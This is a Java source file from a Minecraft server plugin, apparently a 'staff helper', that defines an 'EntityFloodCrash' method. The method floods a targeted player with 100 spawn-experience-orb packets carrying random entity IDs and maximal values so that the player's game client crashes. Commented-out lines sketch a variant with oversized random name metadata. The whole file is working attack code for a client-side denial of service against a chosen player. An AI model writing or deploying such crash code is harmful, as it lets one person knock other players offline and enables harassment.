package dev.xnlawa.staffhelper.crash.impl;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.entity.data.EntityData;
import com.github.retrooper.packetevents.protocol.entity.data.EntityDataTypes;
import com.github.retrooper.packetevents.protocol.entity.type.EntityTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerSpawnExperienceOrb;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerSpawnLivingEntity;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import dev.xnlawa.staffhelper.util.RandomUtil;
import dev.xnlawa.staffhelper.util.Scheduler;
import org.bukkit.Location;
import org.bukkit.entity.Player;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

public class EntityFloodCrash extends Crash {
    public EntityFloodCrash() {
        super(CrashMethod.ENTITY_FLOOD);
    }

    @Override
    public void performCrash(Player player) {
        Scheduler.runAsync(() -> {
            for (int i = 0; i < 100; i++) {
                int entityId = ThreadLocalRandom.current().nextInt(100000, 200000);
//                UUID uuid = UUID.randomUUID();
//
//                Location loc = player.getLocation().add(0, 1, 0);
//                Vector3d position = new Vector3d(loc.getX(), loc.getY(), loc.getZ());
//                float yaw = loc.getYaw();
//                float pitch = loc.getPitch();
//                float headPitch = pitch;
//                Vector3d velocity = new Vector3d(0, 0, 0);

                List<EntityData<?>> metadata = new ArrayList<>();
//                metadata.add(new EntityData<>(2, EntityDataTypes.OPTIONAL_COMPONENT,  Optional.of("§k§r" + RandomUtil.randomString(RandomUtil.nextInt(1235,2234)))));
//
//                metadata.add(new EntityData<>(3, EntityDataTypes.BOOLEAN, true));
                WrapperPlayServerSpawnExperienceOrb packet = new WrapperPlayServerSpawnExperienceOrb(
                        entityId,
                        player.getLocation().getX(),
                        player.getLocation().getY(),
                        player.getLocation().getZ(),
                        Short.MAX_VALUE
                );

                PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
            }
        });
    }
}
